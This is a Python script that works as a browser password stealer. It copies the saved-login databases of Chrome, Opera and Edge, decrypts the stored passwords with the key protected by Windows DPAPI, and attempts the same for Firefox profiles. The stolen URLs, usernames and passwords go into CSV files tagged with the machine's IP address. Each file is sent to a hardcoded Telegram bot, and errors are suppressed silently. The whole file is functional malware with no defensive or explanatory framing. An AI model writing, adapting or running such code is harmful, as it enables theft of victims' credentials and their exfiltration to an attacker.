import os
import re
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv
import requests
import socket

BROWSER_PATHS = {
    "chrome": os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE'])),
    "opera": os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable" % (os.environ['USERPROFILE'])),
    "firefox": os.path.normpath(r"%s\AppData\Roaming\Mozilla\Firefox\Profiles" % (os.environ['USERPROFILE'])),
    "edge": os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data" % (os.environ['USERPROFILE']))
}

def get_ip_address():
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception as e:
        return "unknown_ip"

def send_to_telegram(file_path):
    chat_id = "6970038422"
    token = "7651282744:AAF0Yd-OdSENyAu4JeqssC2z_YqMoJlt14o"
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    
    with open(file_path, 'rb') as f:
        requests.post(url, data={"chat_id": chat_id}, files={"document": f})

def get_secret_key(browser):
    try:
        if browser == "chrome" or browser == "edge":
            local_state_path = os.path.join(BROWSER_PATHS[browser], "Local State")
            with open(local_state_path, "r", encoding='utf-8') as f:
                local_state = json.loads(f.read())
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        else:
            return None
    except Exception as e:
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password).decode()
        return decrypted_pass
    except Exception as e:
        return ""

def get_db_connection(db_path):
    try:
        shutil.copy2(db_path, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None

def extract_chrome_opera_edge(browser):
    secret_key = get_secret_key(browser)
    folders = [element for element in os.listdir(BROWSER_PATHS[browser]) if re.search("^Profile*|^Default$", element) is not None]

    ip_address = get_ip_address()
    file_path = f'decrypted_password_{browser}_{ip_address}.csv'
    
    with open(file_path, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        csv_writer.writerow(["index", "url", "username", "password"])

        for folder in folders:
            db_path = os.path.join(BROWSER_PATHS[browser], folder, 'Login Data')
            conn = get_db_connection(db_path)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url, username, ciphertext = login
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        csv_writer.writerow([index, url, username, decrypted_password])
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")

    send_to_telegram(file_path)

def decrypt_firefox_passwords(profile_path):
    logins_path = os.path.join(profile_path, "logins.json")
    ip_address = get_ip_address()
    file_path = f'decrypted_password_firefox_{ip_address}.csv'
    
    with open(logins_path, "r", encoding="utf-8") as f:
        logins_data = json.load(f)

    with open(file_path, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        csv_writer.writerow(["index", "url", "username", "password"])

        for index, login_entry in enumerate(logins_data["logins"]):
            url = login_entry["hostname"]
            username = login_entry["encryptedUsername"]
            password = login_entry["encryptedPassword"]
            decrypted_username = win32crypt.CryptUnprotectData(base64.b64decode(username), None, None, None, 0)[1].decode()
            decrypted_password = win32crypt.CryptUnprotectData(base64.b64decode(password), None, None, None, 0)[1].decode()
            csv_writer.writerow([index, url, decrypted_username, decrypted_password])

    send_to_telegram(file_path)

def extract_firefox():
    profile_paths = [os.path.join(BROWSER_PATHS["firefox"], profile) for profile in os.listdir(BROWSER_PATHS["firefox"]) if os.path.isdir(os.path.join(BROWSER_PATHS["firefox"], profile))]
    
    for profile_path in profile_paths:
        decrypt_firefox_passwords(profile_path)

if __name__ == '__main__':
    try:
        for browser in ["chrome", "opera", "edge"]:
            extract_chrome_opera_edge(browser)
        extract_firefox()
    
    except Exception as e:
        pass
